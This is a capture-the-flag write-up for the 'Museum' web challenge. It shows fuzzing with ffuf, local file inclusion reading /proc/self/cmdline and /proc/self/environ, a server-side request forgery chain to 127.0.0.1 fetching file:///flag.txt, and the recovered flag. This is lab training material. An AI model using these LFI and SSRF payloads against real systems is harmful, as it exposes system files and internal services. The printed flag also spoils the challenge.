# Museum
```
Check out our museum of artifacts! Apparently, soon they will allow public submissions, just like in Animal Crossing!

Retrive the flag out of /flag.txt in the root of the file system.
```

## Writeup

fuzz using 
```
 ffuf -c -w lfi.txt -u 'http://challenge.nahamcon.com:30718/browse?artifact=FUZZ'
```
try to get the flag.txt file:

using procfs `/proc/self/cmdline` to get the source file path:
`http://challenge.nahamcon.com:30634/browse?artifact=/./proc/self/cmdline`
and the `/proc/self/environ` returns:
```
MAIL=/var/mail/museumUSER=museumHOME=/home/museumLOGNAME=museumPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binLANG=C.UTF-8SHELL=/bin/shPWD=/home/museumLC_ALL=C.UTF-8
```
get that:
```python3/home/museum/app.py
```
then, 

http://127.0.0.1:5000/private_submission?url=file:///flag.txt&filename=flag3.txt
http://challenge.nahamcon.com:31838/private_submission_fetch?url=http%3A%2F%2F127.0.0.1%3A5000%2Fprivate_submission%3Furl%3Dfile%3A%2F%2F%2Fflag.txt%26filename%3Dflag3.txt

http://challenge.nahamcon.com:31838/public/flag3.txt
flag{c3d727275bee25a40fae2d2d2fba9d70}

